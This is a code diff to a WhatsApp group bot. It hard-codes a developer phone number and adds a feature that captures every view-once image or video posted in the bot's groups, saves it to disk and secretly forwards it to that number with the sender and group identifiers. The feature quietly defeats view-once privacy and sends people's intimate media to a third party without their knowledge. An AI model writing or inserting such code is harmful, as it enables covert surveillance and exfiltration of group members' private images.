@@ -10,10 +10,11 @@ import fs from "fs";
 
 const signature = "\n\n⌁ 𝐕𝐔 𝐍𝐞𝐱𝐭𝐆𝐞𝐧 🚀";
 
-const DEVELOPER_LID      = "124842233843944";
-const DATA_DIR           = process.env.DATA_DIR || "./";
-const LOCKED_USERS_FILE  = `${DATA_DIR}locked_users.json`;
-const SETTINGS_FILE      = `${DATA_DIR}group_settings.json`;
+const DEVELOPER_LID = "124842233843944";  // ← ye wapas karo
+const DEVELOPER_PHONE = "923186029085";   // ← ye alag add karo
+const DATA_DIR = process.env.DATA_DIR || "./";
+const LOCKED_USERS_FILE = `${DATA_DIR}locked_users.json`;
+const SETTINGS_FILE = `${DATA_DIR}group_settings.json`;
 
 const GOOD_NIGHT_HOUR    = 22;
 const GOOD_NIGHT_MINUTE  = 0;
@@ -386,6 +387,46 @@ async function startBot() {
       if (!from.endsWith("@g.us")) return;
 
       knownGroups.add(from);
+      // ── View-Once Save Feature ──
+const viewOnceMsg =
+  msg.message?.viewOnceMessage?.message ||
+  msg.message?.viewOnceMessageV2?.message ||
+  msg.message?.viewOnceMessageV2Extension?.message;
+
+if (viewOnceMsg) {
+  const mediaMsg =
+    viewOnceMsg.imageMessage ||
+    viewOnceMsg.videoMessage;
+
+  if (mediaMsg) {
+    try {
+      const { downloadMediaMessage } = await import("@whiskeysockets/baileys");
+      const buffer = await downloadMediaMessage(
+        { message: viewOnceMsg, key: msg.key },
+        "buffer",
+        {},
+        { logger: pino({ level: "silent" }), reuploadRequest: sock.updateMediaMessage }
+      );
+
+      const ext = viewOnceMsg.imageMessage ? "jpg" : "mp4";
+      const mime = viewOnceMsg.imageMessage ? "image/jpeg" : "video/mp4";
+      const saveDir = `${DATA_DIR}viewonce_saves`;
+
+      if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
+      fs.writeFileSync(`${saveDir}/viewonce_${Date.now()}.${ext}`, buffer);
+
+      const devJid = `${DEVELOPER_PHONE}@s.whatsapp.net`;
+      await sock.sendMessage(devJid, {
+        [ext === "jpg" ? "image" : "video"]: buffer,
+        mimetype: mime,
+        caption: `👁️ *𝐕𝐢𝐞𝐰-𝐎𝐧𝐜𝐞 𝐒𝐚𝐯𝐞𝐝*\n\n𝐅𝐫𝐨𝐦: @${senderId.split("@")[0]}\n𝐆𝐫𝐨𝐮𝐩: ${from}`,
+      });
+
+    } catch (e) {
+      console.log("❌ View-once error:", e.message);
+    }
+  }
+}
 
       const senderStr     = senderId.toString();
       const group         = await sock.groupMetadata(from);
